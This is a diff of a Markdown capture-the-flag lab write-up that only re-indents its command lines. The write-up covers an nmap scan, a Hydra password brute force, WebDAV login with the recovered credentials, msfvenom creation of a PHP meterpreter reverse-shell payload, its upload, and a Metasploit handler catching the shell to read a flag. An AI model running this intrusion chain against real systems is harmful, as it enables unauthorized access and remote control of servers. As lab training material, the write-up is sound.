@@ -4,7 +4,7 @@
 First step would be to do an ifconfig in the terminal to see what the Kali machine IP is.
 
 Command:
-`ifconfig`
+    `ifconfig`
 
 Result:
 IP 192.168.1.90 and Netmask 255.255.255.0
@@ -14,7 +14,7 @@ IP 192.168.1.90 and Netmask 255.255.255.0
 Next was to scan all IPs on the same network in the subnet. Knowing the subnet of netmask of 255.255.255.0 is /24 it can be established in the nmap scan.
 
 Command: 
-`nmap -sS -A 192.168.1.1/24`
+    `nmap -sS -A 192.168.1.1/24`
 
 Result:
 IP 192.168.1.105
@@ -44,14 +44,14 @@ To crack the password via brute force Hydra was used to run a wordlist against u
 Word lists in Kali are located in the /usr/share/wordlists directory. So in the terminal the wordlists folder was navigated to. Then the rockyou.txt.gz was unzipped using gunzip.
 
 Commands: 
-`cd /usr/share/wordlists`
-`ls`
-`gunzip rockyou.txt.gz`
+    `cd /usr/share/wordlists`
+    `ls`
+    `gunzip rockyou.txt.gz`
 
 Then using the common wordlist of rockyou.txt with Hydra was used to brute force.
 
 Command:
-`hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
+    `hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
 
 Result:
 login: ashton 
@@ -85,9 +85,9 @@ Search for Cadaver by clicking the Kali Linux icon at the top left of the toolba
 This opens a terminal with Cadaver running
 
 Commands:
-`open http://192.168.1.105/webdav`
-`Username: ryan`
-`Password: linux4u`
+    `open http://192.168.1.105/webdav`
+    `Username: ryan`
+    `Password: linux4u`
 
 ![Cadaver server connection](/Images/cadaver-server-connection.png "Cadaver server connection")
 
@@ -111,18 +111,18 @@ A PHP reverse shell payload will be used since PHP is a server side language.
 Using Metasploit a script can be found to create a payload and upload it to the WebDav server.
 
 Commands:
-`msfconsole`
-`msfvenom -l payloads`
+    `msfconsole`
+    `msfvenom -l payloads`
 
 Results:
-`php/meterpreter/reverse_tcp`
+    `php/meterpreter/reverse_tcp`
 
 ![Meterpreter search results](/Images/meterpreter-search-results.png "Meterpreter search results")
 
 Once a list of payloads is output and the PHP specific reverse tcp script is found the payload can be created.
 
 Command:
-`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.90 LPORT=4444  > shell.php`
+    `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.90 LPORT=4444  > shell.php`
 
 Results:
 A file called shell.php is now created/in root and ready to move to upload to WebDav server.
@@ -132,11 +132,11 @@ A file called shell.php is now created/in root and ready to move to upload to We
 Time to go back to WebDav server. Once again Cadaver was used to access the server and upload the shell.php payload. This will be done using username ryan and password linux4u just as done before.
 
 Command:
-`open http://192.168.1.105/webdav`
-`Username: ryan`
-`Password: linux4u`
-`put /root/shell.php`
-`ls`
+    `open http://192.168.1.105/webdav`
+    `Username: ryan`
+    `Password: linux4u`
+    `put /root/shell.php`
+    `ls`
 
 Result:
 shell.php was uploaded to to the WebDav server
@@ -149,12 +149,12 @@ This could have been done via the File Manager as well. Shell.php could have bee
 Time to use Metasploit to create a meterperter session and run the shell.php.
 
 Commands:
-`msfconsole`
-`use exploit/multi/handler`
-`set LHOST 192.168.1.90`
-`set LPORT 4444`
-`set PAYLOAD php/meterpreter/reverse_tcp`
-`run`
+    `msfconsole`
+    `use exploit/multi/handler`
+    `set LHOST 192.168.1.90`
+    `set LPORT 4444`
+    `set PAYLOAD php/meterpreter/reverse_tcp`
+    `run`
 
 ![Meterperter session creation](/Images/meterpreter-session.png "Meterperter session creation")
 
@@ -172,13 +172,13 @@ After that it is seen that a meterpreter session was opened. Once open search th
 Once going back up 3 folders a flag.txt file was found.
 
 Commands:
-`cd ../`
-`cd ../`
-`cd ../`
-`ls -l`
-`cat flag.txt`
+    `cd ../`
+    `cd ../`
+    `cd ../`
+    `ls -l`
+    `cat flag.txt`
 
 Results:
-`b1ng0w@5h1sn@m0`
+    `b1ng0w@5h1sn@m0`
 
 ![captured flag](/Images/captured-flag.png "captured flag")
